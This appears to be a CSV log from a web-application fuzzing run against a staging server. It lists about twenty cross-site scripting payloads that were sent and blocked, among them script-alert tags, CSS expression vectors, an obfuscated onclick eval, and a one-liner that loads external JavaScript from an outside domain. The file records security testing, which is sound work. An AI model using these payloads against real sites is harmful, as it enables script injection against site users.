Task ID,Message Type,Req. Timestamp,Method,URL,Code,Reason,RTT,Size Req. Header,Size Req. Body,Size Resp. Header,Size Resp. Body,Highest Alert,State,Payloads
0,Original,Tue Jun 02 18:19:31 CEST 2020,POST,https://staging.itapp.eus/,200,OK,149,579,324,426,5738,,,[]
2,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,202,579,145,426,5518,,Blocked,[XSS STYLE=xss:e/**/xpression(alert('XSS'))>]
5,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,205,579,133,426,5519,,Blocked,"[""><script>alert('XSS')</script>]"
4,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,208,579,149,426,5522,,Blocked,[XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>]
3,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,222,579,145,426,5518,,Blocked,[XSS-STYLE=xss:e/**/xpression(alert('XSS'))>]
1,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,224,579,143,426,5519,,Blocked,[</XSS STYLE=xss:expression(alert('XSS'))>]
7,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,161,579,159,426,5531,,Blocked,[Exploit Name: A very short cross browser header injection]
8,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,170,579,213,426,5579,,Blocked,[Exploit String: with(document)getElementsByTagName('head')[0].appendChild(createElement('script')).src='//ŋ.ws']
10,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,170,579,145,426,5517,,Blocked,"[Exploit Tags: xss, short, header, injection]"
9,Fuzzed,Tue Jun 02 18:22:54 CEST 2020,POST,https://staging.itapp.eus/,200,OK,174,579,234,426,5605,,Blocked,[Exploit Description: This vector shows one of the shortest possible ways to inject external JavaScript into a website's header area.]
11,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,144,579,121,426,5493,,Blocked,[Author Name: .mario]
13,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,171,579,140,426,5512,,Blocked,[Exploit Name: Add onclick event hadler]
14,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,181,579,178,426,5545,,Blocked,[Exploit String: onclick=eval/**/(/ale/.source%2b/rt/.source%2b/(7)/.source);]
15,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,153,579,209,426,5581,,Blocked,[Exploit Description: This vector adds an onclick event handler to a tag and appends an obfuscated JS alert.]
16,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,279,579,173,426,5545,,Blocked,"[Exploit Tags: general, JS breaking, basic, obfuscated, user interaction]"
17,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,271,579,121,426,5493,,Blocked,[Author Name: kishor]
19,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,179,579,147,426,5519,,Blocked,[Exploit Name: Advanced HTML injection locator]
20,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,180,579,267,426,5555,,Blocked,[Exploit String: <s>000<s>%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e]
21,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,157,579,177,426,5549,,Blocked,[Exploit Description: This vector indicates HTML injections by stroked text.]
22,Fuzzed,Tue Jun 02 18:22:55 CEST 2020,POST,https://staging.itapp.eus/,200,OK,171,579,149,426,5521,,Blocked,"[Exploit Tags: general, html breaking, injection]"
